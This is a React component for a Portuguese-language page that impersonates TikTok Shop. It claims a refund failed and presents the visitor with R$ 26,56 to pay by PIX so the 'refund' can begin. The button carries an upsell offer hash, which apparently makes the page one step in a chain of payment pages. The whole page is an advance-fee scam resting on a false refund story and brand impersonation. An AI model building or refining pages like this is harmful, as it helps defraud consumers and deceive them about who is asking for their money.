import { XCircle, Info } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-shop.png";

const Upsell4 = () => {
  return (
    <div className="min-h-screen bg-secondary/30 flex flex-col">
      {/* Header TikTok */}
      <div className="bg-card py-4 border-b border-border">
        <img 
          src={tiktokLogo} 
          alt="TikTok" 
          className="h-8 mx-auto"
        />
      </div>

      <div className="flex-1 p-4 space-y-4 max-w-md mx-auto w-full">
        {/* Card Erro */}
        <div className="bg-card rounded-2xl p-6 shadow-card border-2 border-rose-400">
          <div className="bg-rose-100 rounded-xl p-6 text-center">
            <div className="w-16 h-16 rounded-full bg-rose-500 flex items-center justify-center mx-auto mb-4">
              <XCircle className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-xl font-bold text-rose-500 mb-3">
              Erro no Processamento
            </h1>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Identificamos uma falha no processamento do seu reembolso. Seu pagamento será reembolsado integralmente assim que confirmado.
            </p>
          </div>
        </div>

        {/* Card Processo de Reembolso */}
        <div className="bg-card rounded-2xl p-6 shadow-card border-l-4 border-rose-400">
          <div className="flex items-center gap-2 mb-4">
            <Info className="w-5 h-5 text-rose-500" />
            <h2 className="text-lg font-bold text-foreground">Processo de Reembolso</h2>
          </div>
          <ul className="space-y-3 text-muted-foreground text-sm">
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O valor será reembolsado automaticamente após a confirmação do pagamento</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O reembolso será processado na mesma forma de pagamento utilizada</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground mt-2 flex-shrink-0"></span>
              <span>O prazo para compensação pode variar de acordo com sua instituição financeira</span>
            </li>
          </ul>
        </div>

        {/* Card Valor */}
        <div className="bg-card rounded-2xl p-6 shadow-card text-center">
          <p className="text-muted-foreground text-sm uppercase tracking-wide mb-2">
            VALOR A SER REEMBOLSADO
          </p>
          <p className="text-4xl font-extrabold text-rose-500 mb-3">
            R$ 26,56
          </p>
          <p className="text-muted-foreground text-sm">
            Clique abaixo para confirmar o pagamento e iniciar o processo de reembolso
          </p>
        </div>

        {/* Botão Paradise One-Click */}
        <button
          className="paradise-upsell-btn w-full font-bold py-4 px-6 rounded-xl text-base transition-colors shadow-lg uppercase tracking-wide"
          style={{ backgroundColor: '#ff3870', color: '#ffffff' }}
          data-offer-hash="upsell_6c2b550d052dd269"
          data-modal-title="Finalize com PIX para garantir sua oferta!"
          data-copy-button-text="Copiar Código PIX"
          data-modal-bg="#ffffff"
          data-modal-title-color="#1f2937"
          data-modal-btn-color="#28a745"
          data-modal-btn-text-color="#ffffff"
        >
          CONFIRMAR PAGAMENTO
        </button>
      </div>
    </div>
  );
};

export default Upsell4;
